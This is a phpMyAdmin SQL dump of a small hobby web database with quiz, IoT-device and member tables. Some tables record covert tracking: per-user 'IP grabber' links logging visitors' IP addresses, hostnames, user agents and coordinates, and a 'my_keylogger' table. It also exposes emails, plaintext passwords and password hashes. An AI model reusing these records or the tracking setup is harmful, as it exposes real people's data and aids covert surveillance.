-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Mar 11, 2025 at 10:05 AM
-- Server version: 10.6.21-MariaDB
-- PHP Version: 8.3.15

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `awdoaxbf_iotdb`
--

-- --------------------------------------------------------

--
-- Table structure for table `4stge_formation_pratique`
--

CREATE TABLE `4stge_formation_pratique` (
  `id` int(11) NOT NULL,
  `formation_name` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `4stge_formation_pratique`
--

INSERT INTO `4stge_formation_pratique` (`id`, `formation_name`) VALUES
(1, 'bisinesse plan'),
(2, 'creation des e/ses'),
(3, 'RH & la pale'),
(4, 'declaration TVA');

-- --------------------------------------------------------

--
-- Table structure for table `4stge_question`
--

CREATE TABLE `4stge_question` (
  `int` int(11) NOT NULL,
  `question` varchar(250) NOT NULL,
  `category_id` int(11) NOT NULL,
  `question_a` varchar(250) NOT NULL,
  `question_b` varchar(250) NOT NULL,
  `question_c` varchar(250) NOT NULL,
  `question_d` varchar(250) NOT NULL,
  `correct_answer` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `4stge_question`
--

INSERT INTO `4stge_question` (`int`, `question`, `category_id`, `question_a`, `question_b`, `question_c`, `question_d`, `correct_answer`) VALUES
(1, 'Which among the following affect the propagation of the Radio Waves in the atmosphere of earth?', 1, 'Reflection', 'Refraction', 'Diffraction', 'Absorption', 0),
(2, 'In which of the following respects, the ultra-violet radiations are similar to white light?', 1, 'Both obey the laws of reflection and refraction', 'Both travel with same speed in vacuum', 'Both are equally active chemically', 'Both are scattered equally', 0);

-- --------------------------------------------------------

--
-- Table structure for table `4stge_question_category`
--

CREATE TABLE `4stge_question_category` (
  `id` int(11) NOT NULL,
  `question_category` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `4stge_question_category`
--

INSERT INTO `4stge_question_category` (`id`, `question_category`) VALUES
(1, 'achat'),
(2, 'vente'),
(3, 'caisse'),
(4, 'banque');

-- --------------------------------------------------------

--
-- Table structure for table `4stge_question_details`
--

CREATE TABLE `4stge_question_details` (
  `id` int(11) NOT NULL,
  `question` varchar(255) NOT NULL,
  `question_id` int(11) NOT NULL,
  `question_category` varchar(100) NOT NULL,
  `question_category_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `4stge_question_details`
--

INSERT INTO `4stge_question_details` (`id`, `question`, `question_id`, `question_category`, `question_category_id`) VALUES
(1, 'Which among the following affect the propagation of the Radio Waves in the atmosphere of earth?', 1, 'achat', 1);

-- --------------------------------------------------------

--
-- Table structure for table `4stge_video_link_table`
--

CREATE TABLE `4stge_video_link_table` (
  `id` int(11) NOT NULL,
  `video_link` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `4stge_video_link_table`
--

INSERT INTO `4stge_video_link_table` (`id`, `video_link`) VALUES
(1, 'https://timxn.com/ecom/frenchquiz/uploaded_video/1MP4.mp4'),
(2, 'https://timxn.com/ecom/frenchquiz/uploaded_video/2MP4.mp4');

-- --------------------------------------------------------

--
-- Table structure for table `book_library_backup`
--

CREATE TABLE `book_library_backup` (
  `id` int(11) NOT NULL,
  `name` varchar(200) NOT NULL,
  `description` varchar(200) NOT NULL,
  `image` varchar(200) NOT NULL,
  `pdf` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `book_library_backup`
--

INSERT INTO `book_library_backup` (`id`, `name`, `description`, `image`, `pdf`) VALUES
(1, 'new', 'data', 'myimage.png', 'mypdf.pdf'),
(2, 'iei', 'usjje', 'IMG102759699.jpg', 'PD1642852508.pdf'),
(3, 'iei', 'usjje', 'IMG459362740.jpg', 'PD1030091426.pdf'),
(4, 'iei', 'usjje', 'IMG334109785.jpg', 'PD920576632.pdf'),
(5, 'hshs', 'uasus', 'IMG160734871.jpg', 'PD17988315.pdf');

-- --------------------------------------------------------

--
-- Table structure for table `device_list_table`
--

CREATE TABLE `device_list_table` (
  `id` int(11) NOT NULL,
  `device_id` varchar(60) NOT NULL,
  `device_name` varchar(60) NOT NULL,
  `device_switch_no` int(60) NOT NULL,
  `date_time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `device_list_table`
--

INSERT INTO `device_list_table` (`id`, `device_id`, `device_name`, `device_switch_no`, `date_time`) VALUES
(1, 'ranwifi01', 'nodemcu01', 4, '2021-10-31 09:03:57'),
(2, 'vishnuwifi01', 'nodemcue', 4, '2021-10-31 09:04:13'),
(3, 'ranwifi02', 'ranwifi2', 4, '2021-12-15 10:08:19'),
(5, 'ranwifi03', 'twetw', 4, '2021-12-16 14:14:02'),
(6, 'ufo_123', 'Ufo Gaming', 8, '2021-12-31 05:37:44');

-- --------------------------------------------------------

--
-- Table structure for table `iot_table`
--

CREATE TABLE `iot_table` (
  `id` int(11) NOT NULL,
  `load_1` varchar(20) NOT NULL,
  `load_2` varchar(20) NOT NULL,
  `load_3` varchar(20) NOT NULL,
  `load_4` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `iot_table`
--

INSERT INTO `iot_table` (`id`, `load_1`, `load_2`, `load_3`, `load_4`) VALUES
(1, 'LOW', 'HIGH', 'HIGH', 'HIGH');

-- --------------------------------------------------------

--
-- Table structure for table `ip_table`
--

CREATE TABLE `ip_table` (
  `id` int(11) NOT NULL,
  `userUniqueId` varchar(100) NOT NULL,
  `ip_address` text NOT NULL,
  `latitude` varchar(25) NOT NULL,
  `longitude` varchar(25) NOT NULL,
  `created_date` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `ip_table`
--

INSERT INTO `ip_table` (`id`, `userUniqueId`, `ip_address`, `latitude`, `longitude`, `created_date`) VALUES
(14, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 6763\nUser Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 05:56:29'),
(15, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 18809\nUser Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 05:57:20'),
(16, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 12444\nUser Agent: WhatsApp/2.21.15.20 A\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 07:42:18'),
(17, 'ranojan6114b7994df86', 'IP Address: 27.97.7.132\nHostname: 27.97.7.132\nPort Number: 13118\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:26.8756\nand Longitude:80.9115\n\n', '26.8756', '80.9115', '2021-08-12 08:26:46'),
(18, 'ranojan60fa9cff00cfd', 'IP Address: 27.97.7.132\nHostname: 27.97.7.132\nPort Number: 13118\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:26.8756\nand Longitude:80.9115\n\n', '26.8756', '80.9115', '2021-08-12 08:27:12'),
(19, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 25950\nUser Agent: WhatsApp/2.21.15.20 A\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 11:33:30'),
(20, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 33105\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 11:33:39'),
(21, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 33105\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 11:34:04'),
(22, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 33105\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 11:34:07'),
(23, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 33105\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 11:34:28'),
(24, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 7908\nUser Agent: WhatsApp/2.21.15.20 A\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 11:35:14'),
(25, 'ranojan6114b7994df86', 'IP Address: 223.233.65.85\nHostname: abts-north-dynamic-85.65.233.223.airtelbroadband.in\nPort Number: 33105\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-12 11:35:19'),
(26, 'ranojan60fa9cff00cfd', 'IP Address: 47.31.217.162\nHostname: 47.31.217.162\nPort Number: 35192\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:28.6519\nand Longitude:77.2315\n\n', '28.6519', '77.2315', '2021-08-12 11:46:28'),
(27, 'ranojan6114b7994df86', 'IP Address: 47.31.214.216\nHostname: 47.31.214.216\nPort Number: 36310\nUser Agent: WhatsApp/2.21.15.20 A\nHTTP Referer: \nLatitude:28.6519\nand Longitude:77.2315\n\n', '28.6519', '77.2315', '2021-08-12 15:51:20'),
(28, 'ranojan6114b7994df86', 'IP Address: 152.57.212.237\nHostname: 152.57.212.237\nPort Number: 43340\nUser Agent: Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:18.5196\nand Longitude:73.8554\n\n', '18.5196', '73.8554', '2021-08-12 15:52:31'),
(29, 'ranojan6114b7994df86', 'IP Address: 223.233.66.183\nHostname: abts-north-dynamic-183.66.233.223.airtelbroadband.in\nPort Number: 5609\nUser Agent: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36\nHTTP Referer: \nLatitude:28.6677\nand Longitude:77.4337\n\n', '28.6677', '77.4337', '2021-08-13 11:20:28'),
(30, 'ranojan6114b7994df86', 'IP Address: 173.252.127.28\nHostname: fwdproxy-frc-028.fbsv.net\nPort Number: 49248\nUser Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\nHTTP Referer: \nLatitude:37.751\nand Longitude:-97.822\n\n', '37.751', '-97.822', '2021-08-13 11:42:08'),
(31, 'ranojan6114b7994df86', 'IP Address: 173.252.127.9\nHostname: fwdproxy-frc-009.fbsv.net\nPort Number: 41640\nUser Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\nHTTP Referer: \nLatitude:37.751\nand Longitude:-97.822\n\n', '37.751', '-97.822', '2021-08-13 11:42:08'),
(32, 'ranojan6114b7994df86', 'IP Address: 66.220.149.7\nHostname: fwdproxy-prn-007.fbsv.net\nPort Number: 33288\nUser Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\nHTTP Referer: \nLatitude:37.751\nand Longitude:-97.822\n\n', '37.751', '-97.822', '2021-08-13 11:42:10'),
(33, 'ranojan6114b7994df86', 'IP Address: 173.252.79.30\nHostname: fwdproxy-vll-030.fbsv.net\nPort Number: 60864\nUser Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\nHTTP Referer: \nLatitude:37.751\nand Longitude:-97.822\n\n', '37.751', '-97.822', '2021-08-13 11:42:10'),
(34, 'iot6174edf006503', 'IP Address: 47.31.217.228\nHostname: 47.31.217.228\nPort Number: 44530\nUser Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nHTTP Referer: \nLatitude:28.6519\nand Longitude:77.2315\n\n', '28.6519', '77.2315', '2021-10-24 06:39:56');

-- --------------------------------------------------------

--
-- Table structure for table `licence_table`
--

CREATE TABLE `licence_table` (
  `id` int(11) NOT NULL,
  `licence_no` varchar(255) NOT NULL,
  `androidID` varchar(255) NOT NULL,
  `date` varchar(255) NOT NULL DEFAULT current_timestamp(),
  `comment` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `licence_table`
--

INSERT INTO `licence_table` (`id`, `licence_no`, `androidID`, `date`, `comment`) VALUES
(1, '1827', '8c8083e2aadcca22', '2024-10-11 05:45:10', ''),
(8, '1827', 'd7ea08acc9f5e1b4', '2024-10-11 06:55:12', ''),
(13, '1827', '', '2024-10-12 19:01:11', ''),
(14, '1827', 'f52a8fc9d0747441', '2025-01-28 17:17:01', ''),
(16, '1827', 'e3c2c2db6cb8fe4c', '2025-01-28 17:21:48', ''),
(21, '1827', 'cc29d921796c130e', '2025-01-29 01:35:27', ''),
(22, '1827', 'ff7c29fb2dd3a186', '2025-01-29 02:07:10', '');

-- --------------------------------------------------------

--
-- Table structure for table `member`
--

CREATE TABLE `member` (
  `user_id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `full_name` varchar(50) NOT NULL,
  `device_code` varchar(60) NOT NULL,
  `userUniqueId` varchar(100) NOT NULL,
  `ip_grabber_link` varchar(256) NOT NULL,
  `password_hash` varchar(256) NOT NULL,
  `salt` varchar(256) NOT NULL,
  `created_date` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `member`
--

INSERT INTO `member` (`user_id`, `username`, `full_name`, `device_code`, `userUniqueId`, `ip_grabber_link`, `password_hash`, `salt`, `created_date`) VALUES
(43, 'ranojan', 'ranojan', '', 'ranojan6114b7994df86', 'https://timxn.com/ecom/memberOfIptracker/getip.php?userId=ranojan6114b7994df86', '$2y$10$GC0LKepRyoGWRY1U8T49zeQVxB0nRYp08v3SYZwODRIOEBnaXlvcC', '966a43b60809772da70c3b320cadd3056db037ce886d85c949c0a05bb260d5c0', '2021-08-12 05:54:33'),
(44, 'ranjan', 'ranjan', '', 'ranjan611dedac567c6', 'https://timxn.com/ecom/memberOfIptracker/getip.php?userId=ranjan611dedac567c6', '$2y$10$27rszxdatk68b5cEiRO4seodhtXrmQf3DBgNR35AzaRDN9LhAKiZS', 'a95052f091b0def54f12e5d0b6fb471a3690fe3078019b1e0d30c01b1b3c61e5', '2021-08-19 05:35:40'),
(45, 'rnjn', 'rnjn', '', 'rnjn6141d83c4e3d4', 'https://timxn.com/ecom/memberOfIptracker/getip.php?userId=rnjn6141d83c4e3d4', '$2y$10$iDrNac85nqu8j/wI5QuBg.yqRootPnmVuq81EgfMO1zGJI/07qmlO', '8378803ad8c0960bf8469d70b352d28e15a936bfa11d9522ebdabcdd2d062fca', '2021-09-15 11:25:48'),
(46, 'iot', 'iot', '', 'iot6174edf006503', 'https://timxn.com/ecom/emded_system/getip.php?userId=iot6174edf006503', '$2y$10$4h0iF50uztHM0HNnZHOp7u79nqkadc0f6nyD6B7RwK9VDbs1OoGhq', '7ec567ffaf7ca7535097125f7ef0d64e50b839b9ed20bf51bfdfbab27b0f9fcd', '2021-10-24 05:24:00'),
(47, 'switch', 'switch', 'rnjn123', 'switch61750f214c49a', 'https://timxn.com/ecom/emded_system/getip.php?userId=switch61750f214c49a', '$2y$10$VKPYrFy1l2NTvxV8LDkno.N9U6FGi/uAM0Attp3KYuE2t/rODGu66', 'eac222b25d860ee4ff66c9720bff254d97ffce075e4dbf6109bc9231e15d087a', '2021-10-24 07:45:37'),
(48, 'qwet', 'qwet', 'ranwifi01', 'qwet617512f0bd63a', 'https://timxn.com/ecom/emded_system/getip.php?userId=qwet617512f0bd63a', '$2y$10$P4XI1/3SeTgZN.CQFCosdeSge3Fk/sOujLWtjb11UvKfz9Woe1She', '3664a05977dbef9e5a17eef13ddde79de3c45a53e3fbd72d5ab79882a05fd8fb', '2021-10-24 08:01:52'),
(49, 'qwert', 'qwert', 'ranwifi01', 'qwert6175142a40359', 'https://timxn.com/ecom/emded_system/getip.php?userId=qwert6175142a40359', '$2y$10$EmmUb.EuySHfujs9unxqSuF70F49FZjQKARSVnnJLtXgWgDnM999G', '70fc351f7e091d202dd46cc55d58603d0d20fe86afa3e18f2b87330160c06e03', '2021-10-24 08:07:06'),
(50, 'vishnu', 'vishnu', 'vishnuwifi01', 'vishnu61754566b2676', 'https://timxn.com/ecom/emded_system/getip.php?userId=vishnu61754566b2676', '$2y$10$OvO9bZc9tQ24WOnaKALK..G3gsMkYYbdEO.kzMHNS1Modi3yYjs9u', '6a54461043dc3a88236306c5c88a59e3a116de945fd72ece8cf13f1762ea689c', '2021-10-24 11:37:10'),
(51, 'rnk', 'rnk', '', 'rnk61c95aa424b79', 'https://timxn.com/ecom/emded_system/getip.php?userId=rnk61c95aa424b79', '$2y$10$0GM0DXBIV.gYr0p7rZkGjOhxDJGQ02.aA5T4JrhOWUbtabQbVZpk2', '236c4672decbf0fed9450b55ba8e48f7c2aa071bf30d3ec1e08c3ef40a4d2c36', '2021-12-27 06:18:12'),
(52, 'rnkn', 'ranojan kumar biswas', '', 'rnkn61c95b873e2e4', 'https://timxn.com/ecom/emded_system/getip.php?userId=rnkn61c95b873e2e4', '$2y$10$zoze8HHHE48ootToklR/xODW4dirv7GWDcMr80xl5SEygACiQa3re', '19b0237d4c63ef03039617f1366e5d44e7a381a479bbc7f98489560ceee13399', '2021-12-27 06:21:59'),
(53, 'rewt', 'rewt', '', 'rewt61d2c1d005f18', 'https://timxn.com/ecom/emded_system/getip.php?userId=rewt61d2c1d005f18', '$2y$10$by/wTn64koIgxM0yormMJ.RkfBu6kdYR4nt6AA6.tF3pX3zxX0wL6', '75948294021559a049db59696e72b8ff2fde334d78eae818e6e8e352991edc7b', '2022-01-03 09:28:48'),
(54, 'mskit', 'mskit', '', 'mskit61d42e2b6fb6b', 'https://timxn.com/ecom/emded_system/getip.php?userId=mskit61d42e2b6fb6b', '$2y$10$3cae7U2djsTROR/jn/W0xetIbs.43LDvdsaxVjKIO3/GIVioDTnA.', 'f8549ed2a6575aba64ee86885c12179df6dc13e5ac1e35d60ccef7e1bc91cd56', '2022-01-04 11:23:23'),
(55, 'rano', 'ranjan', '', 'rano635a8c0e4f8f5', 'https://timxn.com/ecom/emded_system/getip.php?userId=rano635a8c0e4f8f5', '$2y$10$NoQJ9vhBQHF44Y4alAtVwO0mkwCqnKZZDA0tHVXNluD8i7aW6OnzO', 'e5cd0fa050a2b11867cf600c13325330009646fc90bc180bca7279ce4830330b', '2022-10-27 13:47:58'),
(56, 'rana', 'ranjan', '', 'rana639c5cc1388b7', 'https://timxn.com/ecom/emded_system/getip.php?userId=rana639c5cc1388b7', '$2y$10$s4mRFAOGX.RSh7lg4V8i5.KG3Mwj.QYmlMXrsZWhPwuM15NhrzP3m', 'f8a46e7a50ec0183e24110b1aa54216d4e34b5d96ed2a1c55a6ff6be8e1887bc', '2022-12-16 11:55:45'),
(57, 'master', 'Master Kit', '', 'master63cfda9ad4ed4', 'https://timxn.com/ecom/emded_system/getip.php?userId=master63cfda9ad4ed4', '$2y$10$mSTkW2EViOs5dhy72TB7/OhNiK/UqzDc5iqWOUpi3NL9TrmpCFdDW', '44c8a53070ddbf29f521c7e3e3883e26c9ce88c8a93826e1e7d8703adaf36396', '2023-01-24 13:18:18'),
(58, 'farhan', 'farhan', '', 'farhan63d1351cd0848', 'https://timxn.com/ecom/emded_system/getip.php?userId=farhan63d1351cd0848', '$2y$10$C9Ct.Sj8YhhUU.mLJ.NoWuI312nn5ueTvOVRDGKFJQPJ3cICTfRIG', '60e518bc2b9a0b834a422d931dfda96fcfd9bf15e2cc35b8374814c7034f2bf2', '2023-01-25 13:56:44'),
(59, 'kit', 'kit', '', 'kit63d560e20e7d2', 'https://timxn.com/ecom/emded_system/getip.php?userId=kit63d560e20e7d2', '$2y$10$EriT3ksBx46epvQk2Jr1zev2HM8.OMyemGqfuXpejM.n.e0y1TkSC', '475474be92f6ec9c97ac46f5a0fdedbccd60c1873710fb76c6d43bb1f5884c60', '2023-01-28 17:52:34'),
(60, 'mit', 'jhon', '', 'mit63d66376cf1bf', 'https://timxn.com/ecom/emded_system/getip.php?userId=mit63d66376cf1bf', '$2y$10$3Had6Ez4sxMmJUIagDHfVOuoaKhoV4jPfh.fHGDqWyJjPhC4n3wzy', '920cf67c10e7b04dbd459739d955fbb958bbf7da2843abbb4613666e8aa28f78', '2023-01-29 12:15:50'),
(61, 'ggg', 'gg', '', 'ggg675d553331ff7', 'https://timxn.com/ecom/emded_system/getip.php?userId=ggg675d553331ff7', '$2y$10$.o.57HjpTOMnsUqzcUlZsealWySA/4mDf0tXbzQUU9rIYB.1B00vS', 'e5cfd93409c45eed15399372b959083196862233bc132f653021a18c06c3e99c', '2024-12-14 09:51:47'),
(62, 'myname', 'ranjan', '', 'myname675d5d0b63475', 'https://timxn.com/ecom/emded_system/getip.php?userId=myname675d5d0b63475', '$2y$10$OThWT7zYxORsq5RL.2iHg.7hr5UcTnHzs2Gv48sRQvDKX4JFj7oAG', 'd490efd5a79f4870286858e3f2c9902dc7864c2abecc77f8fabcd9f10a9bcdce', '2024-12-14 10:25:15');

-- --------------------------------------------------------

--
-- Table structure for table `my_keylogger`
--

CREATE TABLE `my_keylogger` (
  `id` int(11) NOT NULL,
  `data_logger_link` varchar(255) NOT NULL,
  `device_id` varchar(255) NOT NULL,
  `date_time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `my_keylogger`
--

INSERT INTO `my_keylogger` (`id`, `data_logger_link`, `device_id`, `date_time`) VALUES
(678, 'https://www.timxn.com/ecom/8236dbdbbcd24d82.txt', '8236dbdbbcd24d82', '2023-06-02 09:42:19');

-- --------------------------------------------------------

--
-- Table structure for table `questions`
--

CREATE TABLE `questions` (
  `id` int(11) NOT NULL,
  `topic` varchar(50) NOT NULL,
  `question` text NOT NULL,
  `option1` varchar(100) DEFAULT NULL,
  `option2` varchar(100) DEFAULT NULL,
  `option3` varchar(100) DEFAULT NULL,
  `option4` varchar(100) DEFAULT NULL,
  `correct_option` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `questions`
--

INSERT INTO `questions` (`id`, `topic`, `question`, `option1`, `option2`, `option3`, `option4`, `correct_option`) VALUES
(1, 'Crypto', 'What is the value of Bitcoin?', '9000', '10000', '15000', '20000', 15000);

-- --------------------------------------------------------

--
-- Table structure for table `quiz`
--

CREATE TABLE `quiz` (
  `id` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `question` varchar(200) NOT NULL,
  `option_1` varchar(200) NOT NULL,
  `option_2` varchar(200) NOT NULL,
  `option_3` varchar(200) NOT NULL,
  `option_4` varchar(200) NOT NULL,
  `correct_answer` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `quiz`
--

INSERT INTO `quiz` (`id`, `title`, `question`, `option_1`, `option_2`, `option_3`, `option_4`, `correct_answer`) VALUES
(1, 'How to sex', 'Best sex ostion', 'stand', 'seat', 'lay', 'oppostie', 'stand'),
(2, 'just chill', 'how to chill', '1', '2', '3', '4', '3');

-- --------------------------------------------------------

--
-- Table structure for table `quiz_result`
--

CREATE TABLE `quiz_result` (
  `id` int(11) NOT NULL,
  `email` varchar(200) NOT NULL,
  `result` varchar(200) NOT NULL,
  `verdict` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `quiz_result`
--

INSERT INTO `quiz_result` (`id`, `email`, `result`, `verdict`) VALUES
(1, 'xerospace24@gmail.com', '0', 'Wrong Answer');

-- --------------------------------------------------------

--
-- Table structure for table `register`
--

CREATE TABLE `register` (
  `id` int(11) NOT NULL,
  `name` varchar(200) NOT NULL,
  `email` varchar(200) NOT NULL,
  `password` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `register`
--

INSERT INTO `register` (`id`, `name`, `email`, `password`) VALUES
(1, 'ranjan', 'xerospace24@gmail.com', 'admin@123'),
(2, 'admin', 'admin@gmail.com', 'admin@123'),
(3, 'Ranjan', 'ranojank@gmail.com', '1234');

-- --------------------------------------------------------

--
-- Table structure for table `rtm_control`
--

CREATE TABLE `rtm_control` (
  `id` int(11) NOT NULL,
  `device_id` varchar(200) NOT NULL,
  `device_name` varchar(200) NOT NULL,
  `device_room_name` varchar(200) NOT NULL,
  `level_status` varchar(100) NOT NULL,
  `date_time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `rtm_control`
--

INSERT INTO `rtm_control` (`id`, `device_id`, `device_name`, `device_room_name`, `level_status`, `date_time`) VALUES
(2, 'dff', 'Rtm 1', 'hgfdd', '20', '2024-12-05 06:37:39'),
(3, 'device code', 'Rtm 4', 'dfgg', '10', '2024-12-05 09:42:25'),
(4, 'hi', 'Rtm 3', 'ggg', '30', '2024-12-05 06:37:50'),
(5, 'xspax', 'my d', 'Rtm 8', '', '2024-12-05 10:03:55');

-- --------------------------------------------------------

--
-- Table structure for table `rtm_device`
--

CREATE TABLE `rtm_device` (
  `id` int(11) NOT NULL,
  `device_id` varchar(200) NOT NULL,
  `device_name` varchar(200) NOT NULL,
  `date_time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `stock_company_table`
--

CREATE TABLE `stock_company_table` (
  `id` int(11) NOT NULL,
  `company_name` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `stock_company_table`
--

